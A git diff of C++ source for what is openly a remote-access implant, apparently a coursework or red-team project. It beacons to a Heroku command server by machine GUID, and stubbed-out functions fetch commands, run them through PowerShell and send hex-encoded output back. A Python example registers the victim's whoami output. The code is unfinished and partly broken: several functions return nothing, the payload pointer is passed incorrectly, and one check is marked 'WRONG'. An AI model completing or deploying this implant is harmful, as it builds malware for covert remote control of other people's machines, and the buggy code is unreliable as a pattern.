@@ -34,14 +34,16 @@
 #include <info.h> 
 #include <http.h>
 
-std::wstring server = L"ch0nky.herokuapp.com"; 
+std::wstring server = L"ch0nkybear.herokuapp.com"; 
 std::wstring register_path = L"/register";
 std::wstring checkin_path = wcscat( L"/checkin/", GetMachineGuid()); //concat with implant_id
 int port = 443;
 bool useTLS = 1;
 
 //Make request
-std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, bool useTLS, std::wstring payload, DWORD payloadLength){ //DO SOMETHING WITH PAYLOAD
+
+
+std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, bool useTLS, std::wstring payload, DWORD payloadLength){
     HINTERNET hSession = NULL;
     HINTERNET hConnect = NULL;
     HINTERNET hRequest = NULL;
@@ -49,6 +51,11 @@ std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, bool
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
     LPSTR pszOutBuffer;
+    const wchar_t *payloadBuffer= new wchar_t [payloadLength];
+    payloadBuffer = payload.c_str();
+    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
+    DWORD headersLength = -1L;
+
     std::wstring result = std::wstring();
     wchar_t* buffer;
     hSession = ::WinHttpOpen(L"WinHTTP Demo/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME , WINHTTP_NO_PROXY_BYPASS, 0);
@@ -60,7 +67,7 @@ std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, bool
         else
             hRequest = ::WinHttpOpenRequest(hConnect, L"POST", uri.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (hRequest)
-        bResults = ::WinHttpSendRequest( hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+        bResults = ::WinHttpSendRequest( hRequest, additionalHeaders, headersLength, &payloadBuffer, payloadLength, payloadLength, 0);
     if(bResults){
         bResults = WinHttpReceiveResponse( hRequest, NULL);
     }
@@ -100,6 +107,7 @@ std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, bool
 
 
 
+
 //Convert from string to hex
 //https://stackoverflow.com/questions/3381614/c-convert-string-to-hexadecimal-and-vice-versa
 std::wstring string_to_hex(const std::wstring &in) {
@@ -118,13 +126,36 @@ std::wstring string_to_hex(const std::wstring &in) {
 //get cmd
 wchar_t *getCMD(){
 
+    /*
+    wchar_t* CMD;
+	    wchar_t* result = makeHttpCMDRequest(server, 443, checkin_path, 1, NULL); //NULL == optional data to send to post request
+	    if(result != NULL){
+		    CMD = result.parse(); //MAKE PARSE FUNCTION
+	    }
+	return CMD; 
+    }*/
+
+
     return;
 }
 
 //Run cmd
 wchar_t *runCMD(wchar_t*CMD){
 
-
+/*
+    wchar_t*output;
+	if(CMD ==NULL){
+		return output;
+	}
+	BOOL h = CreateProcessW();
+	if(!h){
+		return output;
+	}
+	myPipe = CreateNamedPipeW(h);
+	result = pOpen(myPipe, powershell, CMD, output = read(myPipe));
+	output = result.read();
+	return output;
+}*/
 
     return;
 }
@@ -135,9 +166,28 @@ wchar_t *runCMD(wchar_t*CMD){
 //sendResponse(data from runtasks)
 void sendData(wchar_t*output){
 
+    /* 
+    if(Data !=NULL){
+		Data = hex(output);
+		POST(server, 443, checkin_path, 1, Data);
+	} */
+
     return;
 }
 
+/*EXAMPLE OF PYTHON REGISTER Function
+
+implant_id = os.urandom(10).hex()
+    whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
+    output += result.stdout.read().decode()
+    r = requests.post(f"{server}{reigster_path}", json={"implant_id":implant_id, "whoami":whoami})
+    if r.status_code ==200:
+        if r.text == "OK":
+            print("reigstered!")
+            return True 
+        
+    return False 
+	*/
 
 
 //register function
@@ -155,7 +205,7 @@ bool registerImplant(){
     DWORD payload_length = hexpayload.length(); 
 	//post to concat server + registerpath, put into json ?? 
     std::wstring r = makeHttpRequest(server, port, register_path, useTLS, hexpayload, payload_length);
-    if (r == L"201"){
+    if (r == L"201"){ //WRONG
         //Success
         return true;
     }
